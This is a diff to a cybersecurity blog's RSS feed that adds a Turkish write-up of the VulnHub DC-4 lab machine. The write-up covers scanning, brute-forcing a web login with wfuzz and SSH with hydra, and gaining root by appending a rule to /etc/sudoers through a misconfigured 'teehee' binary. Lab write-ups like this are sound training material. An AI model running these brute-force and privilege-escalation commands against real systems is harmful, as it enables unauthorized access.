@@ -5,8 +5,131 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Tue, 29 Sep 2020 13:06:24 +0300</lastBuildDate>
+        <lastBuildDate>Sat, 03 Oct 2020 13:30:54 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB DC-4 Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</link>
+            <pubDate>Sat, 03 Oct 2020 13:30:54 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/10/vulnhub-dc-4-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.
+sudo nmap -sV -sC -p- 192.168.56.113  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-4,313/">VULNHUB</a> &lsquo;da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="/images/vulnhub/dc4/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.113
+</code></pre></div>
+    <img src="/images/vulnhub/dc4/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>80 portunda çalışan web servisine tarayıcından istek atılır.</p>
+
+    <img src="/images/vulnhub/dc4/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web dizin taraması yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirb/big.txt -x php,txt
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.56.113
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,php
+[+] Timeout:        10s
+===============================================================
+2020/10/02 08:33:12 Starting gobuster
+===============================================================
+/command.php (Status: 302)
+/css (Status: 301)
+/images (Status: 301)
+/index.php (Status: 200)
+/login.php (Status: 302)
+/logout.php (Status: 302)
+===============================================================
+2020/10/02 08:33:26 Finished
+===============================================================
+</code></pre><p>Index.php sayfasının login.php sayfasına yönlendirilmiştir. Sqlmap ile login sayfasında Sql Injection açığı için kontrol edildiğinde herhangi bir zafiyet görülmektedir. Login sayfasına admin kullanıcısı için brute-force saldırısı yapılır. Admin kullanıcısı için happy parola bilgisi elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -z file,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt --hs incorrect -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://192.168.56.113/login.php
+</code></pre></div>
+    <img src="/images/vulnhub/dc4/force.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Admin kullanıcısı ile giriş yapılır.</p>
+
+    <img src="/images/vulnhub/dc4/admin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Command sayfasına giriş yapılır.</p>
+
+    <img src="/images/vulnhub/dc4/commandpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Burpsuite aracı ile giden istekler incelenir. İstek gönderilirken boşluk karakteri + ile kodlanmaktadır. wget aracı ile shell alıncak dosya yüklenir. Ancak dizine yazma yetkisi sadece root kullanıcısına ait olduğundan başarısız olunur.</p>
+
+    <img src="/images/vulnhub/dc4/bp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>ls</strong> komutu ile dizinlerde gezinilerek keşif yapılır. jim kullanıcısının home dizini altında bir parola listesi bulunur.</p>
+
+    <img src="/images/vulnhub/dc4/bp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>cat</strong> komutu ile liste görüntülenir ve localhost&rsquo;a ssh servisine yapılacak olan brute force saldırısı için kayıt edilir.</p>
+
+    <img src="/images/vulnhub/dc4/bp3.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Tespit edilen kullanıcılardan wordlist oluşturularak ve hydra aracı ile ssh servisine brute force saldırısı yapılır.</p>
+
+    <img src="/images/vulnhub/dc4/bp4.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L user.lst -P pass.lst ssh://192.168.56.113
+</code></pre></div>
+    <img src="/images/vulnhub/dc4/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Elde edilen bilgiler ile ssh bağlantısı yapılır. <code>Sudo -l</code> komutu girildiğinde parola istenmektedir. Parola rastgele girildiğinde hatalı deneme kullanıcıya mail olarak gönderilmektedir. <em>/var/mail/</em> dizini altında yer alan jim dosyası okunarak kullanıcı mail kutusu kontrol edilir. Charles kullanıcısından gelen bir mailde parola bilgisi yer almaktadır. Charles kullanıcısına geçiş yapılır.</p>
+
+    <img src="/images/vulnhub/dc4/charlesmail.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Charles kullanıcısına ait sudo yetkileri kontrol edilir.</p>
+
+    <img src="/images/vulnhub/dc4/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>Teehee</strong> adlı uygulamanın root yetkisi ile kullanılabileceği tespit edilir. Uygulamanın içeriğine bakılır. Uygulamanın tee uygulaması ile aynı olduğu görülür.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings /usr/bin/teehee
+</code></pre></div>
+    <img src="/images/vulnhub/dc4/tee.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>tee</strong> uygulaması kendisine gönderilen çıktıyı hem dosyaya hemde standart çıkış olan terminal ekranına basar. Sudoers dosyasına charles kullanıcısının tüm komutlarını çalıştırması için düzenlenme yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;charles ALL=(ALL) ALL&#34;</span> | sudo teehee -a /etc/sudoers
+</code></pre></div><p><code>Sudo su</code> ile root kullanıcısına geçilerek <em>/root</em> dizininde yer alan flag değeri okunur.</p>
+
+    <img src="/images/vulnhub/dc4/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB DC-3 Write Up</title>
